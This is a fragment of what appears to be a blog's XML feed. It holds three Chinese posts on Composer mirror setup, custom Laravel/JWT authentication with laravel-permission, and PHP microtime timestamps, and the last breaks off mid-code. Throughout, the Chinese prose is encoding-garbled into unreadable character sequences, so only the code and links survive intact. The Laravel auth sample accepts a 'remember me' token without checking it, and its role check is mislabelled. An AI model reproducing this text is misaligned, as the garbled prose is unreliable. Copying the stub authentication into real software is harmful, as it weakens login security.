        <content type="html"><![CDATA[<p>composerå®˜æ–¹åœ¨<code>2020-10-24</code>å‘å¸ƒcomposer2ï¼ŒåŒ…å¤„ç†èƒ½åŠ›æ•´ä½“æå‡ä¸å°‘ï¼›åŒæ—¶<code>prestissimo</code>é¡¹ç›®æ¨èä½¿ç”¨composer2, å¹¶ä¸”æ”¯æŒèŒƒå›´é™å®šåœ¨2.0ä»¥ä¸‹ç‰ˆæœ¬ã€‚å®˜æ–¹åšå®¢ä¸­æåˆ°composer2.xè™½ç„¶æ”¯æŒ<code>PHP5.6</code>ç­‰ä½ç‰ˆæœ¬ï¼Œåç»­composer2.xç‰ˆæœ¬ä¼šè¦æ±‚PHPåœ¨<code>7.0</code>ä»¥ä¸Šä¸»æµç‰ˆæœ¬ï¼›æ¨èå‡çº§PHPç‰ˆæœ¬ï¼Œæ¯•ç«Ÿ<code>PHP8</code>éƒ½å‡ºæ¥äº†ã€‚</p><p>composer2å‡çº§:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer self-update --2</span><br></pre></td></tr></table></figure><p>composer2æ–°å¢<code>runtime</code>ç‰¹æ€§ï¼Œå…¶ä¸­<code>plaform check</code>åŠŸèƒ½ä¼šæ£€æŸ¥å½“å‰PHPç‰ˆæœ¬ï¼Œå¦‚æœPHPç‰ˆæœ¬ç¬¦åˆåŒ…çš„è¦æ±‚ä¼šæŠ¥é”™ï¼Œå…·ä½“ç‰¹æ€§å‚è€ƒ<a href="https://blog.packagist.com/composer-2-0-is-now-available/">å®˜æ–¹åšå®¢</a></p><p><font color="#dd0000">æ³¨æ„ï¼šé˜¿é‡Œäº‘å’Œè…¾è®¯äº‘composeré•œåƒå­˜åœ¨ä¸€å®šå‡ ç‡å¼‚å¸¸ï¼Œä¼˜å…ˆä½¿ç”¨å®˜æ–¹é•œåƒ </font></p><hr><p>composeræ˜¯PHPé¡¹ç›®åŒ…ç®¡ç†åˆ©å™¨ï¼Œç”±äºå¢™çš„åŸå› å¯¼è‡´åŒ…ä¸‹è½½é€Ÿåº¦ç¼“æ…¢ï¼›composerå…¨é‡é•œåƒä¸»è¦æœ‰phpcomposerã€<del>laravel-china</del>å’Œæ–°å¼€æ”¾çš„é˜¿é‡Œäº‘ã€‚é˜¿é‡Œäº‘æœ€è¿‘å¼€æ”¾composeré•œåƒä»“åº“ï¼Œå¤§å¤§å‡å°‘åŒ…ä¸‹è½½çš„é€Ÿåº¦ã€‚ç¬”è€…æ¨èé˜¿é‡Œäº‘+prestissimoç»„åˆæ–¹å¼ã€‚</p><p>è…¾è®¯äº‘ä¹Ÿè·Ÿéšé˜¿é‡Œçš„è„šæ­¥å¼€æ”¾composerå…¨é‡é•œåƒä»“åº“, <a href="https://mirrors.cloud.tencent.com/help/composer.html">å®˜ç½‘é…ç½®</a>, é˜¿é‡Œçš„composerå¶å°”ä¹Ÿä¼šæŠ½ç­‹ï¼Œå¯èƒ½ä¸æœ¬åœ°ç½‘ç»œæœ‰å…³ :)</p><p>laravel-chinaå…¨é‡é•œåƒä»“åº“å°†ä¼šåœ¨ä¸¤ä¸ªæœˆå·¦å³å…³é—­ï¼Œå…·ä½“ç§»æ­¥<a href="https://learnku.com/articles/30758">é˜…è¯»</a>ã€‚</p><h2 id="é˜¿é‡Œäº‘composeré…ç½®"><a href="#é˜¿é‡Œäº‘composeré…ç½®" class="headerlink" title="#é˜¿é‡Œäº‘composeré…ç½®"></a>#é˜¿é‡Œäº‘composeré…ç½®</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å…¨å±€å®‰è£…(æ¨è): composer config -g repo.packagist composer https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/composer/</span></span><br><span class="line"></span><br><span class="line">å–æ¶ˆé…ç½®: composer config -g --unset repos.packagist</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨composerä¸‹è½½åŒ…æ—¶ä½¿ç”¨-vvvå‚æ•°æ˜¾ç¤ºè¿›åº¦è¯¦æƒ…ï¼Œèƒ½æœ‰æœ‰ä¸€ä¸ªç›´è§‚çš„ä½“ç°ã€‚</p><h2 id="prestissimoå¹¶å‘åŠ é€Ÿ"><a href="#prestissimoå¹¶å‘åŠ é€Ÿ" class="headerlink" title="#prestissimoå¹¶å‘åŠ é€Ÿ"></a>#prestissimoå¹¶å‘åŠ é€Ÿ</h2><p>prestissimoæ˜¯ä¸€ä¸ªå¹¶å‘ä¸‹è½½çš„composeræ’ä»¶ï¼Œé€šè¿‡ä½¿ç”¨curl_multi*ç³»åˆ—æ–¹æ³•å¹¶å‘è¯·æ±‚åŒ…ï¼Œä¸€å®šç¨‹åº¦èŠ‚çº¦æ—¶é—´ã€‚</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å®‰è£…: composer <span class="keyword">global</span> <span class="keyword">require</span> hirak/prestissimo</span><br><span class="line">å¸è½½: composer <span class="keyword">global</span> <span class="keyword">remove</span> hirak/prestissimo</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="#å‚è€ƒ:"></a>#å‚è€ƒ:</h2><ol><li><a href="https://github.com/hirak/prestissimo">prestissimoä»“åº“</a></li><li><a href="https://mirrors.aliyun.com/composer">é˜¿é‡Œäº‘Composerå…¨é‡é•œåƒ</a></li><li><a href="https://mirrors.cloud.tencent.com/composer/">è…¾è®¯äº‘Composerå…¨é‡é•œåƒ</a></li><li><a href="https://blog.packagist.com/composer-2-0-is-now-available/">composer2</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> composer </tag>
            
            <tag> prestissimo </tag>
            
            <tag> composer2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravelè‡ªå®šä¹‰è®¤è¯</title>
      <link href="2019/06/02/laravel%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%A4%E8%AF%81/"/>
      <url>2019/06/02/laravel%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<p>laravelè‡ªå¸¦ç”¨æˆ·è®¤è¯åŸºæœ¬æ»¡è¶³ç®€å•ä¸šåŠ¡éœ€æ±‚ï¼Œå¦‚æœè¦å¼€å‘APIæ¥å£åˆ™éœ€è¦å¼•å…¥jwtè®¤è¯ç»„ä»¶ã€‚jwtç»„ä»¶çš„é…ç½®å‚è€ƒ<a href="https://learnku.com/articles/10885/full-use-of-jwt">JWT å®Œæ•´ä½¿ç”¨è¯¦è§£</a>, æœ¬æ–‡ä¸»è¦è®°å½•ä¸‹å›´ç»•APIä¸JWTè®¤è¯ä¸€äº›ä½¿ç”¨æŠ€å·§ã€‚</p><h2 id="0x1-è‡ªå®šä¹‰è®¤è¯"><a href="#0x1-è‡ªå®šä¹‰è®¤è¯" class="headerlink" title="0x1 è‡ªå®šä¹‰è®¤è¯"></a>0x1 è‡ªå®šä¹‰è®¤è¯</h2><p>å¦‚æœç”¨æˆ·è®¤è¯ä½¿ç”¨ä¸€äº›ä¸‰æ–¹çš„è®¤è¯æœåŠ¡ï¼Œåº”è¯¥å¦‚ä½•å¤„ç†å‘¢ï¼ŸLaravelæä¾›è‡ªå®šä¹‰çš„è®¤è¯çš„å…¥å£ï¼Œé€šè¿‡Providerå½¢å¼æ›¿ä»£åŸæœ‰çš„è®¤è¯é€»è¾‘ã€‚</p><ul><li><p>æ³¨å†Œè‡ªå®šä¹‰è®¤è¯æ–¹æ³•:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app/Providers/AuthServiceProvider.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//çœç•¥...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Register any authentication / authorization services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;registerPolicies();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ³¨å†ŒDIYUserServiceProvider</span></span><br><span class="line">        Auth::provider(<span class="string">&quot;DIY&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DIYUserServiceProvider(<span class="variable">$app</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ä¿®å¤é…ç½®:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#config/auth.php</span></span><br><span class="line">   <span class="string">&#x27;providers&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;users&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;DIY&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆprovideræ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:provider DIYUserServiceProvider</span><br></pre></td></tr></table></figure></li><li><p>å®ç°DIYUserServiceProvideræ–¹æ³•:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app/Providers/DIYUserServiceProvider.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Providers</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Auth</span>\<span class="title">UserProvider</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Auth</span>\<span class="title">Authenticatable</span> <span class="title">as</span> <span class="title">UserContract</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">User</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">DIYUserService</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DIYUserServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span> <span class="keyword">implements</span> <span class="title">UserProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Retrieve a user by their unique identifier.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  mixed  $identifier</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Contracts\Auth\Authenticatable|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">retrieveById</span>(<span class="params"><span class="variable">$identifier</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">// æ ¹æ®è®¤è¯ä¿¡æ¯è·å–ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">        <span class="variable">$user</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//App\Userå¯¹è±¡å¢åŠ Modelå±æ€§attributes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User([<span class="string">&#x27;attributes&#x27;</span> =&gt; <span class="variable">$user</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Retrieve a user by their unique identifier and &quot;remember me&quot; token.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  mixed  $identifier</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Contracts\Auth\Authenticatable|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">retrieveByToken</span>(<span class="params"><span class="variable">$identifier</span>, <span class="variable">$token</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(<span class="variable">$identifier</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Update the &quot;remember me&quot; token for the given user in storage.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Illuminate\Contracts\Auth\Authenticatable  $user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">updateRememberToken</span>(<span class="params">UserContract <span class="variable">$user</span>, <span class="variable">$credentials</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Retrieve a user by the given credentials.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array  $credentials</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Contracts\Auth\Authenticatable|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">retrieveByCredentials</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$credentials</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="variable">$credentials</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Validate a user against the given credentials.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Illuminate\Contracts\Auth\Authenticatable  $user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array  $credentials</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validateCredentials</span>(<span class="params">UserContract <span class="variable">$user</span>, <span class="keyword">array</span> <span class="variable">$credentials</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$credentials</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$credentials</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ç°ç”¨æˆ·è®¤è¯</span></span><br><span class="line">        <span class="keyword">return</span> DIYUserService::auth(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Useræ¨¡å‹<br>è®¤è¯æ–¹æ³•è°ƒç”¨è¿‡ç¨‹ä¸­éƒ½ä¼šä½¿ç”¨åˆ°<code>App\User</code>è¿™ä¸ªç±»æ–‡ä»¶ï¼Œjwtåœ¨è¿™ä¸ªç±»ä¸­å¢åŠ <code>getJWTIdentifier</code>å’Œ<code>getJWTCustomClaims</code>æ–¹æ³•ã€‚DIYUserServiceProvideræ–¹æ³•éœ€è¦å°†éƒ¨åˆ†è®¤è¯ä¿¡æ¯èµ‹äºˆåˆ°Userç±»ã€‚åœ¨åç»­ä½¿ç”¨Laravel-permissionç»„ä»¶æ—¶ä¹Ÿéœ€è¦å¢åŠ ç‰¹å®šæ–¹æ³•ã€‚</p></li></ul><h2 id="0x2-APIé‰´æƒ"><a href="#0x2-APIé‰´æƒ" class="headerlink" title="0x2 APIé‰´æƒ"></a>0x2 APIé‰´æƒ</h2><p>ä¸šåŠ¡æ¨¡å—ä¸åŒï¼Œç”¨æˆ·è§’è‰²ä¸åŒå¯ä»¥é€šè¿‡laravel-permissionæƒé™ç»„ä»¶å®Œæˆå¯¹ç”¨æˆ·æ¥å£è°ƒç”¨æƒé™çš„è¯†åˆ«ã€‚laravel-permissionç»„ä»¶æ˜¯entrustç»„ä»¶çš„æ›¿ä»£å“ï¼Œä¹Ÿæ˜¯é€šè¿‡roleã€permissionå’Œmodelå¯¹ç”¨æˆ·æƒé™æ§åˆ¶ã€‚</p><p>laravel-permissionç»„ä»¶:</p><ul><li>åŸºç¡€ä½¿ç”¨<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºè§’è‰²ã€æƒé™</span></span><br><span class="line"><span class="variable">$role</span> = Role::create([<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span>]);</span><br><span class="line"><span class="variable">$permissions</span> = [</span><br><span class="line">    Permission::create([<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;user-manage&#x27;</span>]),</span><br><span class="line">    Permission::create([<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;role-manage&#x27;</span>]),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$role</span>-&gt;syncPermissions(<span class="variable">$permissions</span>);</span><br></pre></td></tr></table></figure></li><li>APIé™åˆ¶<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è·¯ç”±é…ç½®</span></span><br><span class="line">Route::group([<span class="string">&#x27;middleware&#x27;</span> =&gt; <span class="string">&#x27;role:admin&#x27;</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">#Userç±»å®ç°åˆ¤æ–­æ–¹æ³•(App\User.php)</span></span><br><span class="line"><span class="comment">#è¯¥æ–¹æ³•éœ€è¦å•ç‹¬æ·»åŠ , v5.8ç‰ˆæœ¬ä¸­æ²¡æœ‰hasAnyRoleè¯¥æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasAnyRole</span>(<span class="params"><span class="variable">$roles</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">$this</span>-&gt;getAttribute(<span class="string">&#x27;attributes&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$roles</span> <span class="keyword">as</span> <span class="variable">$role</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$role</span> !== <span class="variable">$user</span>[<span class="string">&#x27;roles&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x3-æ€»ç»“"><a href="#0x3-æ€»ç»“" class="headerlink" title="0x3 æ€»ç»“"></a>0x3 æ€»ç»“</h2><p>laravelçš„ç”Ÿæ€ç³»ç»Ÿä¸°å¯Œï¼Œå„ç§å„æ ·ç»„ä»¶éƒ½å­˜åœ¨ï¼›ä½¿ç”¨ä¸åŒçš„ç»„ä»¶æ’åˆ—ç»„åˆå®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œè™½ç„¶laravelå·ç§°æœ€ä¼˜é›…çš„æ¡†æ¶ï¼Œä½†æ˜¯å†…éƒ¨é€»è¾‘å¤æ‚éš¾æ‡‚ã€‚</p><p>æœ¬æ–‡ç”±äºç¬”è€…èƒ½åŠ›æœ‰é™ï¼Œä¸è¶³ä¹‹å¤„æ¬¢è¿ç•™è¨€æ¢è®¨ã€‚</p><h2 id="0x4-å‚è€ƒ"><a href="#0x4-å‚è€ƒ" class="headerlink" title="0x4 å‚è€ƒ"></a>0x4 å‚è€ƒ</h2><p><a href="https://learnku.com/docs/laravel/5.8/authentication/3906">laravelç”¨æˆ·è®¤è¯æ–‡æ¡£</a><br><a href="https://docs.spatie.be/laravel-permission/v2">laravel-permissionæ–‡æ¡£</a>    </p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> jwt </tag>
            
            <tag> laravel-permission </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>microtimeæ¯«ç§’æ—¶é—´æˆ³é™·é˜±</title>
      <link href="2019/05/30/microtime%E6%AF%AB%E7%A7%92%E6%97%B6%E9%97%B4%E6%88%B3%E9%99%B7%E9%98%B1/"/>
      <url>2019/05/30/microtime%E6%AF%AB%E7%A7%92%E6%97%B6%E9%97%B4%E6%88%B3%E9%99%B7%E9%98%B1/</url>
      
        <content type="html"><![CDATA[<p>æ¯«ç§’æ—¶é—´æˆ³æ˜¯APIå¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨çš„ä¸€ç§æ—¶é—´æ ¼å¼ï¼ŒPHPè¯­è¨€é€šè¿‡microtimeå‡½æ•°è·å–æœºå™¨çš„æ—¶é—´æˆ³ï¼›microtimeå‡½æ•°åº•å±‚ä¾èµ–Cè¯­è¨€çš„gettimeofdayå‡½æ•°è·å–æ•°æ®ã€‚æ¯«ç§’æ—¶é—´æˆ³æ˜¯ä¸€ä¸ª13ä½é•¿åº¦çš„æ•´å‹æ•°æ®ã€‚ç”±äºPHPè¯­è¨€ç‰¹æ€§ï¼Œmictotimeæ¯«ç§’éƒ¨åˆ†é•¿åº¦ä¸å›ºå®šï¼Œçœç•¥äº†0çš„éƒ¨åˆ†ï¼Œé”™è¯¯çš„ä½¿ç”¨ä¼šå¯¼è‡´è·å–çš„æ¯«ç§’æ—¶é—´æˆ³é•¿åº¦å¼‚å¸¸ã€‚</p><h2 id="æ—¶é—´è½¬æ¢ç§‘æ™®"><a href="#æ—¶é—´è½¬æ¢ç§‘æ™®" class="headerlink" title="#æ—¶é—´è½¬æ¢ç§‘æ™®"></a>#æ—¶é—´è½¬æ¢ç§‘æ™®</h2><ul><li>æ¯«ç§’ (ms)</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>ç§’ = <span class="number">1000</span>æ¯«ç§’</span><br><span class="line"><span class="attribute">1</span>æ¯«ç§’ = <span class="number">0</span>.<span class="number">001</span>ç§’</span><br></pre></td></tr></table></figure><ul><li>å¾®ç§’ (us)</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>ç§’ = <span class="number">1000000</span>å¾®ç§’</span><br><span class="line"><span class="attribute">1</span>æ¯«ç§’ = <span class="number">1000</span>å¾®ç§’</span><br></pre></td></tr></table></figure><h2 id="æ¯«ç§’æ—¶é—´æˆ³"><a href="#æ¯«ç§’æ—¶é—´æˆ³" class="headerlink" title="#æ¯«ç§’æ—¶é—´æˆ³"></a>#æ¯«ç§’æ—¶é—´æˆ³</h2><ul><li>ç¤ºä¾‹ä»£ç </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$time</span> = explode(<span class="string">&quot;.&quot;</span>, microtime(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¤„ç†æ¯«ç§’éƒ¨åˆ†</span></span><br><span class="line"><span class="variable">$time</span>[<span class="number">0</span>] = <span class="variable">$time</span>[<span class="number">0</span>] * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$microtime</span> = <span class="variable">$time</span>[<span class="number">0</span>] + substr(<span class="variable">$time</span>[<span class="number">1</span>], <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$microtime</span>); <span class="comment">//è¾“å‡º: 1559197645889</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±äºmicrotimeå‡½æ•°è¿”å›çš„æ¯«ç§’éƒ¨åˆ†æ˜¯<strong>4ä½</strong>ï¼Œgettimeofdayå‡½æ•°è¿”å›çš„æ¯«ç§’éƒ¨åˆ†æ˜¯<strong>6ä½</strong>ï¼›æ‰€ä»¥ç³»ç»Ÿå¯¹æ—¶é—´ç²¾ç¡®åº¦è¦æ±‚é«˜çš„åœ°æ–¹åº”è¯¥æ³¨æ„ã€‚</p><h2 id="microtimeå‡½æ•°å®ç°"><a href="#microtimeå‡½æ•°å®ç°" class="headerlink" title="#microtimeå‡½æ•°å®ç°"></a>#microtimeå‡½æ•°å®ç°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 